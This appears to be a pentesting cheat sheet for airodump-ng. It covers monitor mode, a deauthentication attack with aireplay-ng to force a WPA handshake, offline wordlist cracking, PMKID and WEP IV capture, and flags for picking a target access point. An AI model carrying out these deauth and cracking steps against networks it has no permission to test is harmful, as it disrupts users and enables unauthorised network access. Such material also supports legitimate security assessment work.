# airodump-ng — wireless capture

> **The wifi sniffer.** Lists APs, clients, and captures WPA handshakes for offline cracking with aircrack-ng / hashcat.

**Install check:** `airodump-ng --help` (comes with aircrack-ng suite)

---

## 🎯 Cheat-flow

```text
1. sudo airmon-ng start wlan0        → wlan0mon (monitor mode)
2. sudo airodump-ng wlan0mon         → see all APs, pick BSSID + channel
3. sudo airodump-ng -c <ch> --bssid <BSSID> -w cap wlan0mon
4. (in second shell) aireplay-ng --deauth 5 -a <BSSID> wlan0mon
5. wait for WPA handshake text top-right of airodump
6. aircrack-ng -w wordlist cap-01.cap
```

---

## 🔑 Key flags

| Flag | Meaning |
|---|---|
| `-c <ch>` | Lock to single channel |
| `--bssid <MAC>` | Filter to one AP |
| `-w <prefix>` | Write capture files (`.cap`, `.csv`, `.kismet`, `.netxml`) |
| `--essid <name>` | Filter by SSID |
| `-a` | Hide unassociated clients |
| `-d <MAC>` | Filter shown BSSID |
| `--band abg` | Scan 2.4 + 5 GHz |
| `--wps` | Show WPS info column |
| `--output-format csv,pcap` | Limit output formats |
| `--encrypt WPA2` | Filter encryption type |
| `-i <MAC>` | Don't display station with this MAC |
| `--uptime` | Show AP uptime |
| `--manufacturer` | OUI lookup column |

---

## 📺 Reading the display

**Top pane — APs:**
```
BSSID  PWR  Beacons  #Data  CH  MB  ENC  CIPHER  AUTH  ESSID
```
- `PWR` — signal strength (higher = closer).
- `#Data` — captured data frames (need these for WEP; WPA needs handshake).
- `ENC` — WEP / WPA / WPA2 / WPA3 / OPN.

**Bottom pane — stations:**
```
BSSID  STATION  PWR  Rate  Lost  Frames  Probes
```
Stations with `(not associated)` + Probes show SSIDs a device is searching for.

**Top-right corner** will show `[ WPA handshake: aa:bb:cc:dd:ee:ff ]` when you've captured one — that's the success signal.

---

## 📋 Recipes

```bash
# 1. Scan everything
sudo airodump-ng wlan0mon

# 2. Lock + capture for handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa wlan0mon

# 3. Hidden SSID hunt — wait for a probe/association
sudo airodump-ng --essid-regex '.*' wlan0mon

# 4. PMKID capture (hcxdumptool is faster, but airodump works)
sudo airodump-ng -c 6 --bssid <BSSID> -w pmkid wlan0mon

# 5. WEP: collect IVs quickly
sudo airodump-ng -c 6 --bssid <BSSID> -w wep wlan0mon
# then aireplay-ng ARP replay for IVs
```

---

## ⚠️ Gotchas

- **Needs monitor mode** — run [airmon-ng](airmon-ng.md) first. Otherwise no packets.
- Channel hopping misses handshakes — always **`-c <channel>`** once you've chosen a target.
- Capture file is `prefix-01.cap` (the `-01` auto-increments if prefix exists).
- If no handshake after waiting, force one with [aireplay-ng](aireplay-ng.md) deauth.
- 5 GHz requires adapter support + `--band a`.
- Stop running NetworkManager/wpa_supplicant interference: `sudo airmon-ng check kill`.

---

## 🔗 Related

- [airmon-ng](airmon-ng.md) · [aireplay-ng](aireplay-ng.md) · [aircrack-ng](aircrack-ng.md) · [reaver](reaver.md) · [wifite](wifite.md)
